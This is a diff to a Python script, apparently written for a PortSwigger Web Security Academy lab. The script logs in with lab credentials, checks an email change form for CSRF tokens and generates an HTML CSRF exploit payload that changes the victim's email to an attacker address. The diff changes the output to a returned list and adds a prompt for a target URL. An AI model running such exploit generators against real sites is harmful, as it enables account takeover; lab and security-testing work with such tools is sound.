@@ -6,6 +6,8 @@ import urllib.parse
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 def detect_csrf_vulnerability(base_url):
+    results = []
+    
     # Define the URLs and credentials
     login_url = f"{base_url}/login"
     account_url = f"{base_url}/my-account?id=wiener"
@@ -26,9 +28,12 @@ def detect_csrf_vulnerability(base_url):
     # Log in to the account
     try:
         login_response = session.post(login_url, data=credentials)
+        if login_response.status_code != 200:
+            results.append(f"Login request failed with status code {login_response.status_code}")
+            return results
     except requests.exceptions.RequestException as e:
-        print(f"Error during login request: {e}")
-        return
+        results.append(f"Error during login request: {e}")
+        return results
     
     # Capture the email change form to verify fields
     account_response = session.get(account_url)
@@ -37,8 +42,8 @@ def detect_csrf_vulnerability(base_url):
     
     # Check if the form was found
     if not email_change_form:
-        print("Failed to find the email change form")
-        return
+        results.append("Failed to find the email change form")
+        return results
     
     # Extract form fields
     form_fields = {}
@@ -49,10 +54,9 @@ def detect_csrf_vulnerability(base_url):
     # Check for CSRF tokens
     csrf_tokens = [token for token in form_fields if 'csrf' in token.lower()]
     if csrf_tokens:
-        print("CSRF token found in form, likely not vulnerable")
-        return
+        results.append("CSRF token found in form, likely not vulnerable")
     else:
-        print("No CSRF token found in form, likely vulnerable")
+        results.append("No CSRF token found in form, likely vulnerable")
     
     # Define the new email to be set via CSRF attack
     new_email = "attacker@web-security-academy.net"
@@ -69,10 +73,14 @@ def detect_csrf_vulnerability(base_url):
 </script>
 """
     
-    # Print the CSRF exploit HTML payload
-    print("CSRF Exploit HTML Payload:")
-    print(csrf_exploit_html)
+    # Add the CSRF exploit HTML payload to results
+    results.append("CSRF Exploit HTML Payload:")
+    results.append(csrf_exploit_html)
+    
+    return results
 
-# URL to check
-url_to_check = "https://0acf00400492b54e818fd0e000b5001e.web-security-academy.net"
-detect_csrf_vulnerability(url_to_check)
+if __name__ == "__main__":
+    target_url = input('Enter the URL to test for CSRF vulnerability: ')
+    results = detect_csrf_vulnerability(target_url)
+    for result in results:
+        print(result)
